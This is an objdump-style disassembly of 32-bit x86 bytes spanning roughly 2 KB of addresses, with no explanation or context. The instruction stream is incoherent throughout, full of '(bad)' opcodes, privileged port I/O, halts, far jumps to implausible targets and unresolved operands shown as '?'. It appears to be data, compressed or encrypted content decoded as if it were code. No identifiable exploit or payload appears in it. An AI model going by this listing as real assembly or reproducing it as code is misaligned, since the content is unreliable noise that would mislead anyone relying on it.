  420983:	mov    dl,0x45
  420985:	xchg   ebx,eax
  420986:	dec    esi
  420987:	add    esp,DWORD PTR [edi]
  420989:	shr    BYTE PTR [esi],cl
  42098b:	mov    bh,BYTE PTR ds:0xa83a7ba8
  420991:	js     0x42097b
  420993:	lds    edi,FWORD PTR [ebp+0x44]
  420996:	or     esp,ebx
  420998:	les    ebp,FWORD PTR [ebx+0x8e84e6c]
  42099e:	add    ah,BYTE PTR [esi]
  4209a0:	mov    cl,0xc4
  4209a2:	loop   0x4209ee
  4209a4:	scas   eax,DWORD PTR es:[edi]
  4209a5:	fimul  WORD PTR [esi+0x62]
  4209a8:	nop
  4209a9:	(bad)  [ebp+0x2e]
  4209ac:	rcr    BYTE PTR [esi+eiz*2],1
  4209af:	jne    0x420a24
  4209b1:	add    DWORD PTR [ebx],edx
  4209b3:	fnclex 
  4209b5:	ss sub edx,ebx
  4209b8:	or     dl,bl
  4209ba:	rol    esp,0x28
  4209bd:	stc    
  4209be:	lock push 0xffffffe6
  4209c1:	rol    BYTE PTR es:[eax],0xd0
  4209c5:	fsin   
  4209c7:	adc    al,BYTE PTR [ebx]
  4209c9:	ins    BYTE PTR es:[edi],dx
  4209ca:	cdq    
  4209cb:	fs aaa 
  4209cd:	call   0x64c24629
  4209d2:	push   ecx
  4209d3:	fidiv  WORD PTR [esi+edx*1+0x490ac6b3]
  4209da:	sbb    dl,BYTE PTR [ebx]
  4209dc:	clc    
  4209dd:	mov    esp,0xa4ec5d36
  4209e2:	inc    ecx
  4209e3:	fs (bad) 
  4209e5:	int    0x5
  4209e7:	add    eax,0xa5ffe252
  4209ec:	push   0xb19a50de
  4209f1:	fist   WORD PTR [edi]
  4209f3:	xor    al,0x13
  4209f5:	and    esi,ebx
  4209f7:	hlt    
  4209f8:	fmul   DWORD PTR [ebx-0x74]
  4209fb:	mov    dl,0xa
  4209fd:	lahf   
  4209fe:	pop    ds
  4209ff:	jge    0x420998
  420a01:	lds    edi,FWORD PTR [ebp-0x5d]
  420a04:	in     al,0x74
  420a06:	pop    ds
  420a07:	pop    es
  420a08:	lods   eax,DWORD PTR ds:[esi]
  420a09:	xchg   ecx,eax
  420a0a:	loopne 0x4209ea
  420a0c:	aad    0xb7
  420a0e:	add    al,0xe2
  420a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a11:	inc    BYTE PTR [ebx+0x1b648320]
  420a17:	ror    BYTE PTR [esi+ebp*2],cl
  420a1a:	mov    eax,ds:0x74fec2af
  420a1f:	add    DWORD PTR [eax-0x1f7ba418],eax
  420a25:	je     0x4209c8
  420a27:	add    DWORD PTR [edx],edx
  420a29:	mov    edi,0xace2fca7
  420a2e:	push   edi
  420a2f:	jae    0x420a6e
  420a31:	bound  esp,QWORD PTR ds:0x3b731130
  420a37:	add    BYTE PTR [edi+0x1b3098f7],ah
  420a3d:	and    BYTE PTR [ecx+ebp*8-0xb],0x65
  420a42:	repnz in al,0x59
  420a45:	inc    ebx
  420a46:	clc    
  420a47:	cmp    eax,0x59315248
  420a4c:	aam    0x71
  420a4e:	pop    ebx
  420a4f:	jmp    0x6f55:0x1352b8bd
  420a56:	out    0x19,eax
  420a58:	in     al,0xbb
  420a5a:	je     0x420ac9
  420a5c:	stos   BYTE PTR es:[edi],al
  420a5d:	in     eax,0xa5
  420a5f:	imul   ebx,DWORD PTR [eax+0x6f],0x93ac5bb2
  420a66:	or     ebx,edx
  420a68:	mov    edx,0x553ddbd4
  420a6d:	fild   DWORD PTR [edi-0x33cfa828]
  420a73:	sub    BYTE PTR [eax+0x1c7f5df7],ah
  420a79:	inc    esp
  420a7a:	dec    edi
  420a7b:	je     0x420a18
  420a7d:	sub    dl,BYTE PTR [eax+0x29e2f605]
  420a83:	cdq    
  420a84:	inc    esi
  420a85:	retf   0xc3af
  420a88:	jmp    0xd019:0xa70fc7e0
  420a8f:	and    ah,al
  420a91:	dec    esi
  420a92:	daa    
  420a93:	xchg   BYTE PTR [ecx+0xed58e35],dh
  420a99:	adc    al,0x92
  420a9b:	jge    0x420a4c
  420a9d:	pop    esi
  420a9e:	cli    
  420a9f:	mov    ch,0xc
  420aa1:	fcmovu st,st(4)
  420aa3:	push   0x55
  420aa5:	arpl   WORD PTR [esi-0x70],dx
  420aa8:	data16 jns 0x420a31
  420aab:	es enter 0xe39c,0xdb
  420ab0:	mov    ebx,0x818965ae
  420ab5:	jne    0x420adf
  420ab7:	jno    0x420a57
  420ab9:	mov    ebp,0x5797946f
  420abe:	xor    ebx,ecx
  420ac0:	and    ch,BYTE PTR [edi+0x3c56248f]
  420ac6:	push   esi
  420ac7:	retf   0x64af
  420aca:	retf   0x1fdd
  420acd:	push   esi
  420ace:	pop    ebx
  420acf:	and    BYTE PTR [edi],dh
  420ad1:	sub    al,BYTE PTR [ebx]
  420ad3:	sub    al,0xf8
  420ad5:	adc    al,0xec
  420ad7:	(bad)  
  420ad9:	test   eax,0xdc07dbec
  420ade:	add    eax,0xefa71573
  420ae3:	mov    ecx,0x77d375be
  420ae8:	lock or bl,bl
  420aeb:	jno    0x420b31
  420aed:	enter  0xf92e,0xfa
  420af1:	retf   
  420af2:	sar    BYTE PTR ds:0xa5ebe02c,0x41
  420af9:	call   0xbae7:0xeb5cb161
  420b00:	xchg   BYTE PTR [ecx],dl
  420b02:	std    
  420b03:	je     0x420b2f
  420b05:	cmc    
  420b06:	push   esi
  420b07:	nop
  420b08:	bound  eax,QWORD PTR [esi+0x1b438645]
  420b0e:	add    DWORD PTR [ebx+0x58bc5d98],ebx
  420b14:	test   bh,ch
  420b16:	cli    
  420b17:	xchg   ebp,eax
  420b18:	int    0x5d
  420b1a:	jne    0x420b24
  420b1c:	mov    ds:0x446e894c,eax
  420b21:	popa   
  420b22:	xor    eax,0x11234649
  420b27:	or     eax,DWORD PTR [ebp+0x9f2429e]
  420b2d:	jbe    0x420ab5
  420b2f:	and    DWORD PTR [edx],0x74fcc303
  420b35:	mov    BYTE PTR [eax-0x16f8dee0],al
  420b3b:	add    BYTE PTR [esp+eax*1-0x2],bl
  420b3f:	mov    edx,0x2792d25d
  420b44:	ds push ecx
  420b46:	test   al,0xa
  420b48:	bound  edx,QWORD PTR [eax+0x65]
  420b4b:	cwde   
  420b4c:	test   al,0x97
  420b4e:	mov    ss,WORD PTR [edx+ecx*8-0x51]
  420b52:	pop    ecx
  420b53:	jbe    0xcc5dcf02
  420b59:	mov    dh,0x8a
  420b5b:	mov    edx,0x1d553232
  420b60:	push   eax
  420b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b62:	bound  edi,QWORD PTR [ecx-0x260b3d0e]
  420b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b69:	pop    edi
  420b6a:	dec    ecx
  420b6b:	stos   DWORD PTR es:[edi],eax
  420b6c:	adc    eax,0xeaf5ebd0
  420b71:	(bad)  
  420b72:	es sahf 
  420b74:	sub    DWORD PTR ds:0xaa2b2cfa,edi
  420b7a:	jmp    0xb7c5f685
  420b7f:	cmp    bh,BYTE PTR [edi+0x43]
  420b82:	jbe    0x420b42
  420b84:	xchg   ebx,eax
  420b85:	xchg   esp,eax
  420b86:	fwait
  420b87:	scas   al,BYTE PTR es:[edi]
  420b88:	shl    BYTE PTR [esi+0x8d52f2],cl
  420b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b8f:	or     DWORD PTR [ebx],edx
  420b91:	loopne 0x420b32
  420b93:	out    dx,eax
  420b94:	lock repz in eax,dx
  420b97:	(bad)  
  420b99:	xor    DWORD PTR [ebx-0x3a],edi
  420b9c:	dec    ebx
  420b9d:	mov    ah,0x62
  420b9f:	pop    ss
  420ba0:	sbb    bh,BYTE PTR [esi]
  420ba2:	fbld   TBYTE PTR [ecx+ebx*8+0x738f3431]
  420ba9:	addr16 mov fs,eax
  420bac:	xchg   esp,eax
  420bad:	mov    ebx,0x8f7a8b7
  420bb2:	mov    WORD PTR [eax],ss
  420bb4:	nop
  420bb5:	xlat   BYTE PTR ds:[ebx]
  420bb6:	push   0x6835549e
  420bbb:	jb     0x420c1d
  420bbd:	retf   
  420bbe:	ja     0x420c1e
  420bc0:	pop    edi
  420bc1:	mov    dl,0xd1
  420bc3:	das    
  420bc4:	or     al,0x35
  420bc6:	or     eax,0xcecba170
  420bcb:	mov    bh,0xb3
  420bcd:	push   ecx
  420bce:	aad    0x25
  420bd0:	or     al,0x67
  420bd2:	loop   0x420c08
  420bd4:	loope  0x420c01
  420bd6:	pop    es
  420bd7:	ret    
  420bd8:	cmp    edi,edx
  420bda:	jl     0x420c4d
  420bdc:	xchg   edx,eax
  420bdd:	jae    0x420c36
  420bdf:	push   0xffffffb8
  420be1:	sub    eax,DWORD PTR [esi-0x63eaa251]
  420be7:	jne    0x420c03
  420be9:	fist   DWORD PTR [edi-0x76]
  420bec:	test   DWORD PTR [eax+0x59],edi
  420bef:	jo     0x420bae
  420bf1:	popf   
  420bf2:	dec    edi
  420bf3:	jne    0x420c57
  420bf5:	icebp  
  420bf6:	add    eax,0xee356695
  420bfb:	fisub  WORD PTR [eax]
  420bfd:	mov    ds:0x9993cbd5,eax
  420c02:	je     0x420c4b
  420c04:	call   0x90ce:0xfaa84f41
  420c0b:	mov    ebp,0xef9cc66b
  420c10:	pop    ebx
  420c11:	mov    fs,WORD PTR [ebp-0x169686a2]
  420c17:	cmp    ah,BYTE PTR [esi+0x41]
  420c1a:	or     DWORD PTR [edx-0x395cde06],esp
  420c20:	sub    DWORD PTR [ecx],ebx
  420c22:	mul    DWORD PTR [edx-0x1b]
  420c25:	js     0x420c43
  420c27:	dec    eax
  420c28:	push   ebx
  420c29:	pop    ds
  420c2a:	adc    eax,0x9a628284
  420c2f:	xchg   ebp,eax
  420c30:	mov    ecx,0xae838798
  420c35:	loop   0x420c92
  420c37:	loopne 0x420bc0
  420c39:	push   cs
  420c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3b:	add    DWORD PTR [edx+0x25],esi
  420c3e:	pop    es
  420c3f:	imul   ebx,DWORD PTR [eax],0xffffffd8
  420c42:	jle    0x420c53
  420c44:	stos   DWORD PTR es:[edi],eax
  420c45:	test   DWORD PTR [edi],esp
  420c47:	mov    al,ds:0xbfcc85e2
  420c4c:	or     ah,BYTE PTR [ebp+0x7a5bfc22]
  420c52:	push   esi
  420c53:	loopne 0x420cbf
  420c55:	dec    eax
  420c56:	je     0x420c0e
  420c58:	call   0x1b52:0xd97a55f7
  420c5f:	add    BYTE PTR [edi-0x42],0xe4
  420c63:	push   0xe35e3310
  420c68:	cmp    BYTE PTR [eax+0x66e06c60],0x24
  420c6f:	push   esp
  420c70:	repnz add dl,BYTE PTR [ebx]
  420c73:	sub    eax,0x7758b914
  420c78:	stc    
  420c79:	mov    ch,0x1d
  420c7b:	push   ebx
  420c7c:	call   0xf48fbcc9
  420c81:	pop    ebp
  420c82:	sub    BYTE PTR [esi],0x22
  420c85:	ret    0x4c13
  420c88:	xor    al,0x65
  420c8a:	test   esi,eax
  420c8c:	pushf  
  420c8d:	push   cs
  420c8e:	mov    bl,0x10
  420c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c91:	cmc    
  420c92:	ja     0x420c40
  420c94:	fmul   DWORD PTR [esi]
  420c96:	xchg   esi,eax
  420c97:	sub    edx,ebx
  420c99:	ins    BYTE PTR es:[edi],dx
  420c9a:	mov    bl,0xf9
  420c9c:	mov    ebx,0xf62a2cb8
  420ca1:	ror    BYTE PTR [edi],1
  420ca3:	mov    esi,0x716dfcea
  420ca8:	fs xchg bl,bh
  420cab:	aaa    
  420cac:	pop    edi
  420cad:	inc    ebx
  420cae:	enter  0xd9f0,0x92
  420cb2:	jae    0x420ca8
  420cb4:	sti    
  420cb5:	into   
  420cb6:	mov    dl,0x54
  420cb8:	sub    ah,ah
  420cba:	mov    edx,0x192c5a61
  420cbf:	fstp   st(0)
  420cc1:	fbstp  TBYTE PTR [ebx]
  420cc3:	out    0xbf,eax
  420cc5:	in     eax,dx
  420cc6:	js     0x420ca9
  420cc8:	sub    eax,0x7e99eeba
  420ccd:	push   es
  420cce:	leave  
  420ccf:	enter  0x41d5,0x24
  420cd3:	nop
  420cd4:	mov    dl,0xc2
  420cd6:	repz sub eax,0xdbd9591
  420cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cdd:	enter  0xea72,0x2e
  420ce1:	es aam 0xdd
  420ce4:	retf   0xa8c
  420ce7:	repnz adc eax,DWORD PTR [edx+0x17]
  420ceb:	aad    0x3f
  420ced:	mov    ebx,0x9291518c
  420cf2:	sub    BYTE PTR [esi+eax*1+0x4493b85a],ah
  420cf9:	xchg   esp,eax
  420cfa:	sbb    BYTE PTR [esi],dh
  420cfc:	inc    edi
  420cfd:	rcr    BYTE PTR [ebp-0x11a89543],0xf6
  420d04:	sbb    eax,0x3f7c8b49
  420d09:	fsub   DWORD PTR [edi-0x9]
  420d0c:	adc    al,BYTE PTR [edx-0x13]
  420d0f:	pop    ebx
  420d10:	push   ds
  420d11:	fcom   DWORD PTR [ecx]
  420d13:	fld    TBYTE PTR [ecx]
  420d15:	adc    BYTE PTR [edi],ah
  420d17:	dec    BYTE PTR gs:[eax+0x1a]
  420d1b:	and    dl,dl
  420d1d:	shl    BYTE PTR [ebx+0x3c],0x3
  420d21:	pop    edx
  420d22:	cmp    edi,DWORD PTR [ecx]
  420d24:	cmp    al,0x77
  420d26:	adc    eax,DWORD PTR ds:0xf18bedee
  420d2c:	(bad)  
  420d2d:	iret   
  420d2e:	ret    0x558b
  420d31:	mov    eax,0x2349e9
  420d36:	add    BYTE PTR ds:0xe7c03733,ch
  420d3c:	fsub   QWORD PTR [ebp-0x7d]
  420d3f:	(bad)  [esi-0x53]
  420d42:	jle    0x420cce
  420d44:	mov    bl,ah
  420d46:	adc    al,0xc2
  420d48:	mov    bh,0x61
  420d4a:	bound  edx,QWORD PTR [ecx+0x5f]
  420d4d:	bound  esp,QWORD PTR [edx-0x15]
  420d50:	notrack jmp ebp
  420d53:	sbb    al,BYTE PTR [edi-0x4921c854]
  420d59:	lock neg al
  420d5c:	push   ss
  420d5d:	in     eax,0x20
  420d5f:	inc    ebp
  420d60:	cmp    eax,0xd61fd275
  420d65:	mov    ch,0x8
  420d67:	fldcw  WORD PTR [ecx]
  420d69:	(bad)  
  420d6a:	std    
  420d6b:	xor    al,0x88
  420d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d6e:	arpl   WORD PTR [ebx],si
  420d70:	arpl   WORD PTR [ebx],sp
  420d72:	sub    DWORD PTR [ebp-0x23db128d],edi
  420d78:	cwde   
  420d79:	test   BYTE PTR [esp+ecx*2-0x4c],bh
  420d7d:	pop    ss
  420d7e:	jne    0x420da0
  420d80:	mov    edx,0x8ea70de6
  420d85:	loop   0x420d34
  420d87:	div    DWORD PTR [ecx-0x5eb59aa]
  420d8d:	dec    edx
  420d8e:	pop    eax
  420d8f:	sub    esi,DWORD PTR [esp+esi*4]
  420d92:	aad    0x11
  420d94:	rcl    BYTE PTR fs:[edx],1
  420d97:	inc    ebx
  420d98:	push   0xffffff90
  420d9a:	sub    DWORD PTR [edi+0x74a555ef],edx
  420da0:	loopne 0x420dcb
  420da2:	jns    0x420d34
  420da4:	in     al,0x1a
  420da6:	cmp    esp,ebp
  420da8:	mov    ds:0x3e6669ea,eax
  420dad:	lea    edx,[ebx]
  420daf:	jmp    0xe91a7268
  420db4:	sbb    eax,0x30395d7f
  420db9:	jno    0x420e17
  420dbb:	stc    
  420dbc:	sub    al,0x3d
  420dbe:	sti    
  420dbf:	test   eax,0x35f76f05
  420dc4:	pop    es
  420dc5:	out    dx,al
  420dc6:	or     cl,BYTE PTR [edi]
  420dc8:	cdq    
  420dc9:	fcomip st,st(3)
  420dcb:	ss imul edx,eax,0xe372240e
  420dd2:	jmp    FWORD PTR [esi]
  420dd4:	mov    BYTE PTR [edi-0x32],ch
  420dd7:	sub    al,BYTE PTR [edi+0x47]
  420dda:	xor    al,0x35
  420ddc:	mov    edi,?
  420dde:	icebp  
  420ddf:	pushf  
  420de0:	ss xchg ebp,eax
  420de2:	arpl   sp,si
  420de4:	mov    ch,0xa3
  420de6:	dec    edx
  420de7:	out    dx,al
  420de8:	lods   eax,DWORD PTR ds:[esi]
  420de9:	cmc    
  420dea:	dec    ebp
  420deb:	fstp   TBYTE PTR [ebp-0x2b]
  420dee:	ficomp WORD PTR [eax]
  420df0:	mov    esi,0x4249d615
  420df5:	das    
  420df6:	popf   
  420df7:	mov    ecx,0x3b47352f
  420dfc:	test   ah,dl
  420dfe:	addr16 push edx
  420e00:	shr    DWORD PTR [eax],0x4
  420e03:	aad    0x77
  420e05:	ret    0x7c8e
  420e08:	xchg   esp,eax
  420e09:	mov    edx,DWORD PTR [ecx]
  420e0b:	stos   BYTE PTR es:[edi],al
  420e0c:	mov    WORD PTR [esi+0x2bfd3468],ds
  420e12:	int    0x3c
  420e14:	dec    eax
  420e15:	add    eax,0xbbdcf411
  420e1a:	cmc    
  420e1b:	dec    edi
  420e1c:	adc    DWORD PTR [ecx],0xffffff86
  420e1f:	ror    dl,0xf0
  420e22:	in     eax,0x7
  420e24:	ja     0x420db3
  420e26:	psraw  mm5,QWORD PTR [ebx]
  420e29:	std    
  420e2a:	or     DWORD PTR [edx-0xb],0x6d59b2b0
  420e31:	in     al,dx
  420e32:	mov    ds:0x159d88c9,eax
  420e37:	out    0x3d,al
  420e39:	sbb    DWORD PTR [edx+0x27d97719],eax
  420e3f:	data16 cli 
  420e41:	adc    cl,BYTE PTR [edi]
  420e43:	sub    eax,0x8c84b7f3
  420e48:	jp     0x420e3e
  420e4a:	add    eax,0x92d6fb27
  420e4f:	hlt    
  420e50:	shl    DWORD PTR [edi-0x6c5c411c],0x4e
  420e57:	les    ecx,FWORD PTR [ecx+0x52]
  420e5a:	mov    edx,?
  420e5c:	jae    0x420e0f
  420e5e:	mov    al,0xa1
  420e60:	add    bh,BYTE PTR [ebx+0x69cf52fc]
  420e66:	or     ebp,DWORD PTR [ebx-0x2b]
  420e69:	cmp    edi,ebp
  420e6b:	inc    ebx
  420e6c:	ins    DWORD PTR es:[edi],dx
  420e6d:	jno    0x420e35
  420e6f:	ja     0x420ece
  420e71:	or     eax,0xaf6f5819
  420e76:	loop   0x420ec9
  420e78:	or     BYTE PTR [ebx-0x66c1abc],dl
  420e7e:	mov    edx,0x2a14736e
  420e83:	xchg   BYTE PTR [ebx+ebp*2],ch
  420e86:	push   ss
  420e87:	fcmove st,st(6)
  420e89:	adc    edx,DWORD PTR [ecx]
  420e8b:	add    eax,0xf3e7788c
  420e90:	ins    DWORD PTR es:[edi],dx
  420e91:	sbb    al,0x5f
  420e93:	dec    esp
  420e94:	int3   
  420e95:	sub    eax,0xfb5fe6ee
  420e9a:	je     0x420ed3
  420e9c:	out    0x5a,al
  420e9e:	jnp    0x420e8c
  420ea0:	jl     0x420ee7
  420ea2:	enter  0x84bf,0x11
  420ea6:	daa    
  420ea7:	sub    DWORD PTR [edi-0x4a1d058],0xddc87f20
  420eb1:	add    dl,BYTE PTR [eax+0x2bdda55e]
  420eb7:	and    DWORD PTR [ecx+0x7a331993],ebp
  420ebd:	retf   0xb5d0
  420ec0:	adc    al,0x5b
  420ec2:	xlat   BYTE PTR ds:[ebx]
  420ec3:	out    0x4f,al
  420ec5:	cmp    eax,0xfc29e774
  420eca:	mov    esp,0x386edc17
  420ecf:	adc    eax,0xb8e6d2df
  420ed4:	lds    ebp,FWORD PTR [ebx+0x77209800]
  420eda:	jns    0x420f5b
  420edc:	in     eax,0x87
  420ede:	mov    edi,0xce791a47
  420ee3:	jmp    0xdefd4c44
  420ee8:	inc    edx
  420ee9:	(bad)  
  420eea:	aad    0x52
  420eec:	xor    al,0xfb
  420eee:	jl     0x420e7c
  420ef0:	push   cs
  420ef1:	mov    dl,bl
  420ef3:	jg     0x420f00
  420ef5:	pop    es
  420ef6:	push   edx
  420ef7:	add    eax,esi
  420ef9:	repz out dx,eax
  420efb:	cli    
  420efc:	mov    edx,0xe90b2602
  420f01:	mov    edi,0xb0ac1f45
  420f06:	xchg   BYTE PTR [esi+0x1afdfbf2],al
  420f0c:	pop    ecx
  420f0d:	xchg   DWORD PTR [ecx+0x15],edx
  420f10:	iret   
  420f11:	test   eax,0x16f46ef2
  420f16:	imul   eax,DWORD PTR [edx],0x953ebaf5
  420f1c:	leave  
  420f1d:	adc    dh,BYTE PTR [esi]
  420f1f:	or     al,0xc1
  420f21:	mov    eax,ds:0xc3f7e53d
  420f26:	lahf   
  420f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f28:	sbb    dh,dh
  420f2a:	xchg   esp,eax
  420f2b:	push   ds
  420f2c:	jg     0x420ed7
  420f2e:	jb     0x420f77
  420f30:	xchg   ebx,eax
  420f31:	xchg   edi,eax
  420f32:	push   eax
  420f33:	stc    
  420f34:	cmp    eax,0xc6f1b245
  420f39:	cmp    eax,0x53f439e1
  420f3e:	mov    ah,0x11
  420f40:	sub    DWORD PTR [esi-0x6d],0x3db16d4a
  420f47:	sub    ebp,DWORD PTR ds:0xa56b8f95
  420f4d:	xor    bh,BYTE PTR [ecx]
  420f4f:	inc    esi
  420f50:	js     0x420f28
  420f52:	sub    BYTE PTR [esi+0x59],bl
  420f55:	call   0xd663ba22
  420f5a:	(bad)  
  420f5b:	nop
  420f5c:	in     al,dx
  420f5d:	in     al,0xe5
  420f5f:	jno    0x420f27
  420f61:	inc    edx
  420f62:	or     al,0xe2
  420f64:	data16 jae 0x420f6d
  420f67:	ja     0x420f59
  420f69:	jle    0x420f96
  420f6b:	xor    ch,BYTE PTR [edx+0x6d]
  420f6e:	pop    dx
  420f70:	mov    edi,0xb28a06c2
  420f75:	ss scas al,BYTE PTR es:[edi]
  420f77:	or     DWORD PTR [ebx+0x13],0x4f3728d9
  420f7e:	sbb    cl,ch
  420f80:	leave  
  420f81:	call   FWORD PTR [esi+0xd15f892]
  420f87:	sub    BYTE PTR [esi+eax*4],dh
  420f8a:	inc    eax
  420f8b:	stc    
  420f8c:	int3   
  420f8d:	aaa    
  420f8e:	add    BYTE PTR [edx-0xd],ah
  420f91:	inc    ebx
  420f92:	mov    edi,0x3b8bd92a
  420f97:	push   edi
  420f98:	sbb    bh,cl
  420f9a:	cmc    
  420f9b:	or     edx,DWORD PTR [ecx+esi*2+0x552e472f]
  420fa2:	mov    esp,0x967c162e
  420fa7:	dec    ebx
  420fa8:	mov    eax,0x94886a2e
  420fad:	loopne 0x420fc2
  420faf:	mov    DWORD PTR ds:[esi+0x3a8fc2d7],edi
  420fb6:	sbb    DWORD PTR [eax+edx*1+0x15],edi
  420fba:	sbb    edi,DWORD PTR [ebx+0x37]
  420fbd:	fsub   st(5),st
  420fbf:	adc    al,0xe9
  420fc1:	test   BYTE PTR [ebp+0x14cc1a41],dl
  420fc7:	pop    ds
  420fc8:	fsubp  st(3),st
  420fca:	push   0xffffffcc
  420fcc:	bound  ecx,QWORD PTR [ecx]
  420fce:	jnp    0x421040
  420fd0:	ror    BYTE PTR [ecx-0x2],0x9b
  420fd4:	xchg   ebx,eax
  420fd5:	shl    DWORD PTR es:[edx-0x10],cl
  420fd9:	repz test BYTE PTR gs:0x48d23931,bh
  420fe1:	pop    ecx
  420fe2:	ficom  WORD PTR [esi+ebx*4-0x39f76ba6]
  420fe9:	enter  0xa885,0xca
  420fed:	into   
  420fee:	out    dx,eax
  420fef:	stos   BYTE PTR es:[edi],al
  420ff0:	inc    ebp
  420ff1:	xchg   esi,eax
  420ff2:	es gs daa 
  420ff5:	jbe    0x420f7b
  420ff7:	and    al,0x2
  420ff9:	cwde   
  420ffa:	push   esi
  420ffb:	sub    DWORD PTR [edi],edx
  420ffd:	(bad)
  421000:	or     BYTE PTR [edx],al
  421002:	mov    esp,gs
  421004:	push   ebp
  421005:	cmp    al,0x87
  421007:	or     eax,ebp
  421009:	sub    dl,ah
  42100b:	pop    esp
  42100c:	mov    dh,0x62
  42100e:	ins    DWORD PTR es:[edi],dx
  42100f:	sub    BYTE PTR [edi],bl
  421011:	add    cl,BYTE PTR [edx-0x23c9a309]
  421017:	sbb    BYTE PTR [eax],ch
  421019:	mov    ch,0xc0
  42101b:	int3   
  42101c:	ins    DWORD PTR es:[edi],dx
  42101d:	repnz scas eax,DWORD PTR es:[edi]
  42101f:	pop    ss
  421020:	sub    ecx,esp
  421022:	enter  0x4296,0x78
  421026:	mov    esi,0x8b26bb80
  42102b:	mov    bh,0x54
  42102d:	dec    ebx
  42102e:	ins    DWORD PTR es:[edi],dx
  42102f:	rol    BYTE PTR [eax+ebx*1-0xc2c7a19],1
  421036:	popf   
  421037:	hlt    
  421038:	(bad)  
  421039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42103a:	pop    esi
  42103b:	or     esp,DWORD PTR [ebx]
  42103d:	cmp    esp,DWORD PTR [edx+0x1c]
  421040:	(bad)  
  421041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421042:	lods   eax,DWORD PTR ds:[esi]
  421043:	jbe    0x42103e
  421045:	(bad)  
  421046:	mov    WORD PTR cs:[edi-0x649924bd],cs
  42104d:	xchg   DWORD PTR [esi+0x35f87cbc],edx
  421053:	(bad)  
  421054:	lods   al,BYTE PTR ds:[esi]
  421055:	jmp    0x4210b8
  421057:	sar    DWORD PTR [eax-0x483bb9cd],0xed
  42105e:	inc    ebx
  42105f:	aaa    
  421060:	xor    eax,0xddc5f6ab
  421065:	xor    eax,0x85681da0
  42106b:	cld    
  42106c:	mov    al,0x44
  42106f:	aad    0x95
  421071:	in     eax,dx
  421072:	(bad)  
  421073:	sub    ah,BYTE PTR [edi+0x1]
  421076:	sbb    al,BYTE PTR [ebx+edi*2]
  421079:	add    al,0xd9
  42107b:	add    esp,DWORD PTR [ebx-0x68]
  42107e:	shr    DWORD PTR [edx-0x75],0x4d
  421082:	frstor [ebp-0xe]
  421085:	scas   eax,DWORD PTR es:[edi]
  421086:	jb     0x421055
  421088:	clc    
  421089:	ror    DWORD PTR [edx],1
  42108b:	jbe    0x421094
  42108d:	inc    esp
  42108e:	pop    esp
  42108f:	imul   BYTE PTR [ecx+esi*1]
  421092:	daa    
  421093:	outs   dx,BYTE PTR ds:[esi]
  421094:	adc    edx,DWORD PTR [esi+ebx*4]
  421097:	test   eax,0xa7b4613c
  42109c:	sbb    edi,esi
  42109e:	neg    dl
  4210a0:	call   0x24b6:0xae56b462
  4210a7:	and    esi,DWORD PTR [eax+0x477a3c44]
  4210ad:	sub    DWORD PTR [edx-0x51550ad2],esi
  4210b3:	cbw    
  4210b5:	int3   
  4210b6:	sti    
  4210b7:	hlt    
  4210b8:	or     BYTE PTR [eax-0x475c37e],ah
  4210be:	push   0xffffffd6
  4210c0:	xchg   ebp,eax
  4210c1:	(bad)  
  4210c2:	adc    eax,0x80ab2443
  4210c7:	(bad)  
  4210c8:	icebp  
  4210c9:	loop   0x42113c
  4210cb:	jmp    0x22eb6706
  4210d0:	hlt    
  4210d1:	stos   BYTE PTR es:[edi],al
  4210d2:	mov    al,0xad
  4210d4:	fs test eax,0xc62d2e17
  4210da:	push   esi
  4210db:	and    BYTE PTR [ebp+0x25cc7443],bl
  4210e1:	inc    eax
  4210e2:	mov    ds:0xe8be7977,al
  4210e7:	test   bl,dh
  4210e9:	test   eax,0x92cfa619
  4210ee:	mov    dh,ah
  4210f0:	cs cmc 
  4210f2:	xchg   BYTE PTR [edx],bl
  4210f4:	jl     0x421151
  4210f6:	imul   edx,DWORD PTR [ebp-0x38],0x69
  4210fa:	in     eax,0x29
  4210fc:	mov    esi,0xaccf1faa
  421101:	push   ebx
  421102:	lock add ecx,DWORD PTR [edi+0x7e]
  421106:	and    BYTE PTR ds:0xd275e904,bl
  42110c:	enter  0x2609,0xdf
  421110:	fadd   QWORD PTR [ecx+0x49f5eb39]
  421116:	call   0xaf42:0xde0ff603
  42111d:	ret    
  42111e:	mov    ch,0xd7
  421120:	std    
  421121:	xchg   ebx,eax
  421122:	pop    ebx
  421123:	or     cl,BYTE PTR [ebx+0x1a453cfc]
  421129:	jno    0x4210c6
  42112b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42112c:	fnstsw WORD PTR [ebp-0x13490cc0]
  421132:	hlt    
  421133:	mov    eax,0x82e27f1f
  421138:	sbb    BYTE PTR [ebp-0x2b],ch
  42113b:	in     al,0x7b
  42113d:	dec    esp
  42113e:	imul   ebp,ebx,0xb98be80
  421144:	aaa    
  421145:	add    eax,0x4a7b6d9d
  42114a:	cmp    BYTE PTR [eax+eax*4+0x79a7f9f8],0x5c
  421152:	jo     0x42116a
  421154:	idiv   ch
  421156:	pop    eax
  421157:	sub    eax,0x6470fae1
  42115c:	pop    ecx
  42115d:	inc    esp
  42115e:	sbb    ebp,DWORD PTR [edi]
  421160:	pusha  
  421161:	or     BYTE PTR [ebx+0x2f],cl
  421164:	inc    esp
  421165:	and    eax,0x7b2fc37d
  42116a:	adc    eax,0x1f06670f
  42116f:	push   ebx
  421170:	pop    es
  421171:	cmp    eax,0xd271d7
  421176:	test   esi,ecx
  421178:	and    al,0xed
  42117a:	adc    edi,DWORD PTR [ecx]
  42117c:	mov    dh,0x75
  42117e:	(bad)  
  42117f:	jle    0x421151
  421181:	hlt    
  421182:	addr16 je 0x42111a
  421185:	xchg   ebx,eax
  421186:	hlt    
  421187:	lea    esp,[ebx+edi*8+0xda98668]
  42118e:	sbb    ebx,ebx
  421190:	mov    dh,0x77
  421192:	pop    ss
  421193:	xlat   BYTE PTR ds:[ebx]
  421194:	xchg   esp,eax
  421195:	(bad)  
